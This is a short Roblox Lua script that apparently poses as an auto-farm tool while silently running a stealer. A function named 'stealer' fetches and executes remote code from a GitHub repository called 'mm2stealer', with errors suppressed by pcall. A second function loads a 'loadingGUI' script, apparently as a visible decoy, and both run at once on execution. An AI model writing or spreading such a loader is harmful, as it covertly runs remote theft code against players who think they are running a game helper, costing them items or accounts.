local function stealer()
    pcall(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptsHub11/mm2stealer/refs/heads/main/mm2stealerr'))()
    end)
end

local function farm()
    task.spawn(function()
        -- Wait until LocalPlayer and PlayerGui are fully ready
        local player = game:WaitForChild("Players"):WaitForChild("LocalPlayer")
        local gui = player:WaitForChild("PlayerGui")

        -- Slight extra delay just to be safe
        wait(1)

        pcall(function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptsHub11/loadingGUI/refs/heads/main/loadingGUI'))()
        end)
    end)
end

task.spawn(stealer)
task.spawn(farm)
